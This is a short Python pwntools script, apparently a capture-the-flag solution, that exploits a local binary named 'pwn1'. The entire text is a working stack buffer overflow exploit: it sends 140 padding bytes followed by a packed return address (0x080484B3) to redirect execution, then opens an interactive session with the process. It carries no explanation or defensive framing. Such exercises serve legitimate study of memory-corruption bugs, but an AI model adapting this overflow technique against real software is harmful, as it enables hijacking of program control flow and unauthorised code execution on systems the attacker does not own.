from pwn import *

io = process('./pwn1')

io.recvuntil(":")

addr =  0x080484B3

io.sendline('A'*140+p32(addr))

io.interactive()